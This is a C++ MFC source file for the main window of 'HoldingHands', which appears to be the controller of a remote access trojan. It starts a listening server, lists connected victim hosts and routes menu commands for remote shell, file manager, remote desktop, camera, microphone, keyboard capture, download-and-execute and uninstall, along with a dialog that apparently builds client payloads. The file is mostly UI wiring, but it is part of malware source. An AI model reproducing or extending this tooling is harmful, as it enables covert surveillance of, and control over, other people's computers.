
// MainFrm.cpp : CMainFrame 类的实现
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "IOCPServer.h"
#include "MainFrm.h"
#include "Manager.h"
#include "ClientContext.h"
#include "BuildDlg.h"
#include "SettingDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CMainFrame

IMPLEMENT_DYNAMIC(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_SETFOCUS()
	ON_WM_PAINT()

	ON_WM_TIMER()
	ON_COMMAND(ID_MAIN_STARTSERVER, &CMainFrame::OnMainStartserver)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STARTSERVER, &CMainFrame::OnUpdateMainStartserver)

	ON_MESSAGE(WM_IOCPSVR_START, OnSvrStarted)
	ON_MESSAGE(WM_IOCPSVR_CLOSE, OnSvrStopped)

	//创建Handler对象
	ON_MESSAGE(WM_SOCKET_CONNECT,OnSocketConnect)
	ON_MESSAGE(WM_SOCKET_CLOSE, OnSocketClose)
	//ON_MESSAGE()
	ON_WM_CLOSE()
	ON_COMMAND(ID_MAIN_EXIT, &CMainFrame::OnMainExit)
	//不在MainFrame里面加始终是灰色的.
	ON_COMMAND(ID_SESSION_DISCONNECT, &CMainFrame::OnSessionDisconnect)
	ON_COMMAND(ID_SESSION_UNINSTALL, &CMainFrame::OnSessionUninstall)
	ON_COMMAND(ID_POWER_SHUTDOWN, &CMainFrame::OnPowerShutdown)
	ON_COMMAND(ID_POWER_REBOOT, &CMainFrame::OnPowerReboot)
	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CMainFrame::OnOperationEditcomment)
	ON_UPDATE_COMMAND_UI(ID_MAIN_EXIT, &CMainFrame::OnUpdateMainExit)
	ON_COMMAND(ID_OPERATION_CMD, &CMainFrame::OnOperationCmd)
	ON_COMMAND(ID_OPERATION_CHATBOX, &CMainFrame::OnOperationChatbox)
	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CMainFrame::OnOperationFilemanager)
	ON_COMMAND(ID_OPERATION_REMOTEDESKTOP, &CMainFrame::OnOperationRemotedesktop)
	ON_COMMAND(ID_OPERATION_CAMERA, &CMainFrame::OnOperationCamera)
	ON_COMMAND(ID_SESSION_RESTART, &CMainFrame::OnSessionRestart)
	ON_COMMAND(ID_OPERATION_MICROPHONE, &CMainFrame::OnOperationMicrophone)
	ON_COMMAND(ID_OPERATION_DOWNLOADANDEXEC, &CMainFrame::OnOperationDownloadandexec)
	ON_COMMAND(ID_MAIN_BUILD, &CMainFrame::OnMainBuild)
	ON_COMMAND(ID_MAIN_SETTINGS, &CMainFrame::OnMainSettings)
	ON_COMMAND(ID_OPERATION_KEYBOARD, &CMainFrame::OnOperationKeyboard)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_SERVER_STATU,
	ID_HOST_COUNT,
	ID_HOST_SELECTED,
	ID_UPLOAD_SPEED,
	ID_DOWNLOAD_SPEED,
	ID_CUR_DATE
};

// CMainFrame 构造/析构

CMainFrame::CMainFrame()
{
	// TODO:  在此添加成员初始化代码
	m_View = 0;
	m_pServer = NULL;
	m_bExitAfterStop = FALSE;
	m_listenPort = 10086;
}

CMainFrame::~CMainFrame()
{
}

wchar_t* wszSvrStatu[] =
{
	L"Starting",
	L"Started",
	L"Stopping",
	L"Stopped",
};

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	RECT rect = { 0 };
	//创建状态栏
	if (!m_wndStatusBar.Create(this)){
		TRACE0("未能创建StatuBar\n");
		return -1;      // 未能创建
	}
	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT));
	m_wndStatusBar.SetPaneInfo(0, ID_SERVER_STATU, SBPS_STRETCH, 0);
	m_wndStatusBar.SetPaneInfo(1, ID_HOST_COUNT, SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, ID_HOST_SELECTED, SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(3, ID_UPLOAD_SPEED, SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(4, ID_DOWNLOAD_SPEED, SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(5, ID_CUR_DATE, SBPS_NORMAL, 160);


	if (!m_ClientList.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT,
		rect, this, NULL))
	{
		TRACE0("未能创建ClientList\n");
		return -1;      // 未能创建
	}


	m_View |= (VIEW_SHOW_CLIENLIST);

	m_ServerStatu = SVR_STATU_STOPPED;

	//创建服务器
	CIOCPServer::SocketInit();
	m_pServer = CIOCPServer::CreateServer(m_hWnd);
	
	//用于刷新数据的计时器
	SetTimer(10086, 1000, NULL);

	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO:  在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式

	cs.style |= (CS_HREDRAW | CS_VREDRAW);

	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(0);
	cs.lpszName = L"[HoldingHands]";
	
	return TRUE;
}

// CMainFrame 诊断

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG


// CMainFrame 消息处理程序

void CMainFrame::OnSetFocus(CWnd* /*pOldWnd*/)
{
	
}
void CMainFrame::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO:  在此处添加消息处理程序代码
	// 不为绘图消息调用 CFrameWnd::OnPaint()
	RECT rect;
	RECT StatuBarRect;
	//
	m_wndStatusBar.GetClientRect(&StatuBarRect);
	GetClientRect(&rect);
	rect.bottom -= (StatuBarRect.bottom - StatuBarRect.top);
	m_ClientList.MoveWindow(&rect);
	m_ClientList.ShowWindow(SW_SHOW);
}


void CMainFrame::OnUpdateStatuBar()
{
	//更新时间
	CString PaneText;
	CTime time = CTime::GetTickCount();
	PaneText = time.Format("[%Y-%m-%d %H:%M:%S]");
	m_wndStatusBar.SetPaneText(5, PaneText);
	//更新上传,下载速度.
	DWORD UpSpeed = 0, DoSpeed = 0;
	if (m_pServer)
	{
		UpSpeed = m_pServer->GetWriteSpeed();
		DoSpeed = m_pServer->GetReadSpeed();
	}
	PaneText.Format(L"Upload: %dKB/S", UpSpeed);
	m_wndStatusBar.SetPaneText(3, PaneText);

	PaneText.Format(L"Download: %dKB/s", DoSpeed);
	m_wndStatusBar.SetPaneText(4, PaneText);

	//HostCount
	PaneText.Format(L"Host: %d", m_ClientList.GetItemCount());
	m_wndStatusBar.SetPaneText(1, PaneText);
	//Selected Count
	PaneText.Format(L"Selected: %d", m_ClientList.GetSelectedCount());
	m_wndStatusBar.SetPaneText(2, PaneText);
	//ServerStatu

	PaneText.Format(L"SrvStatu: %s", wszSvrStatu[m_ServerStatu]);
	m_wndStatusBar.SetPaneText(0, PaneText);
}
void CMainFrame::OnTimer(UINT_PTR nIDEvent)
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	//
	switch (nIDEvent)
	{
	case 10086:
		OnUpdateStatuBar();
		break;
	default:
		break;
	}
	CFrameWnd::OnTimer(nIDEvent);
}


void CMainFrame::OnMainStartserver()
{
	// TODO:  在此添加命令处理程序代码
	if (m_ServerStatu == SVR_STATU_STARTED)
	{
		m_ServerStatu = SVR_STATU_STOPPING;
		//移除所有客户端
		m_ClientList.DeleteAllItems();
		m_pServer->AsyncStopSvr();
	}
	if (m_ServerStatu == SVR_STATU_STOPPED)
	{
		m_ServerStatu = SVR_STATU_STARTING;
		m_pServer->AsyncStartSvr(m_listenPort);
	}
}


void CMainFrame::OnUpdateMainStartserver(CCmdUI *pCmdUI)
{
	// TODO:  在此添加命令更新用户界面处理程序代码
	switch (m_ServerStatu)
	{
	case SVR_STATU_STARTED:
		pCmdUI->SetText(L"Stop");
		pCmdUI->Enable();
		break;
	case SVR_STATU_STARTING:
		pCmdUI->SetText(L"Starting");
		pCmdUI->Enable(0);
		break;
	case SVR_STATU_STOPPED:
		pCmdUI->SetText(L"Start");
		pCmdUI->Enable();
		break;
	case SVR_STATU_STOPPING:
		pCmdUI->SetText(L"Stopping");
		pCmdUI->Enable(0);
		break;
	}
}

void CMainFrame::OnMainExit()
{
	// TODO:  在此添加命令处理程序代码
	CMainFrame::OnClose();
}

void CMainFrame::OnClose()
{
	if (IDYES != MessageBox(L"Are you sure?", L"Exit", MB_YESNO))
		return;
	//关闭服务器.(如果已经关闭了也没事,也会继续通知的)
	m_ServerStatu = SVR_STATU_STOPPING;
	m_bExitAfterStop = TRUE;
	m_pServer->AsyncStopSvr();
}



/*****************************************************************************************************
					服务器的通知
******************************************************************************************************/
LRESULT CMainFrame::OnSvrStarted(WPARAM wParam,LPARAM lParam)
{
	if (wParam == 0){
		/*Log(L"Start Server Failed!");*/
		m_ServerStatu = SVR_STATU_STOPPED;
	}
	else{
		/*Log(L"Server is Running.");*/
		m_ServerStatu = SVR_STATU_STARTED;
	}
	return 0;
}

LRESULT CMainFrame::OnSvrStopped(WPARAM wParam, LPARAM lParam)
{
	m_ServerStatu = SVR_STATU_STOPPED;
	/*Log(L"Server has stopped.");*/
	//退出程序
	if (m_bExitAfterStop)
	{
		//在这里做一些清理的工作
		CIOCPServer::DeleteServer();
		m_pServer = NULL;
		KillTimer(10086);
		//clean:

		DestroyWindow();
	}
	return 0;
}

/*************************************************************************
								*日志记录
**************************************************************************/
//void CMainFrame::Log(CString text)
//{
//	DWORD dwTextLength = 0;
//	CTime time = CTime::GetTickCount();
//	CString LogText;
//	LogText = time.Format("[%Y-%m-%d %H:%M:%S]: ");
//	LogText += text;
//	LogText += "\r\n";
//
//	dwTextLength = m_Log.GetWindowTextLengthW();
//	m_Log.SetSel(dwTextLength,dwTextLength,0);
//	m_Log.ReplaceSel(LogText);
//}



/********************************************************************************
							** 创建Handler对象 **
	当socket第一次连接的时候,会根据Identity 创建一个Handler,由于可能涉及窗口,所以在
	主线程里面执行初始化操作

********************************************************************************/

LRESULT CMainFrame::OnSocketConnect(WPARAM wParam, LPARAM lParam)
{
	CClientContext*pContext = (CClientContext*)wParam;
	return CManager::HandlerInit(pContext, lParam);
}

LRESULT CMainFrame::OnSocketClose(WPARAM wParam, LPARAM lParam)
{
	CClientContext*pContext = (CClientContext*)wParam;
	return CManager::HandlerTerm(pContext, lParam);
}

//不在MainFrame里面加消息映射,菜单始终是灰色的mmp.
void CMainFrame::OnSessionDisconnect(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_DISCONNECT, 0);
}
void CMainFrame::OnSessionUninstall(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_UNINSTALL, 0);
}
void CMainFrame::OnPowerShutdown(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_POWER_SHUTDOWN, 0);
}
void CMainFrame::OnPowerReboot(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_POWER_REBOOT, 0);
}
void CMainFrame::OnOperationEditcomment(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_EDITCOMMENT, 0);
}


void CMainFrame::OnUpdateMainExit(CCmdUI *pCmdUI)
{
	// TODO:  在此添加命令更新用户界面处理程序代码
	pCmdUI->Enable(!(m_ServerStatu == SVR_STATU_STOPPING));
}


void CMainFrame::OnOperationCmd()
{
	// TODO:  在此添加命令处理程序代码
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CMD, 0);
}


void CMainFrame::OnOperationChatbox()
{
	// TODO:  在此添加命令处理程序代码
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CHATBOX, 0);
}

void CMainFrame::OnOperationFilemanager()
{
	// TODO:  在此添加命令处理程序代码
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_FILEMANAGER, 0);
}


void CMainFrame::OnOperationRemotedesktop()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_REMOTEDESKTOP, 0);
}


void CMainFrame::OnOperationCamera()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CAMERA, 0);
}


void CMainFrame::OnSessionRestart()
{
	// TODO:  在此添加命令处理程序代码
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_RESTART, 0);
}


void CMainFrame::OnOperationMicrophone()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_MICROPHONE, 0);
}


void CMainFrame::OnOperationDownloadandexec(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_DOWNLOADANDEXEC, 0);
}


void CMainFrame::OnMainBuild(){
	CBuildDlg dlg;
	dlg.DoModal();
}


void CMainFrame::OnMainSettings(){
	CSettingDlg dlg(this);
	dlg.DoModal();
}


void CMainFrame::OnOperationKeyboard(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_KEYBOARD, 0);
}
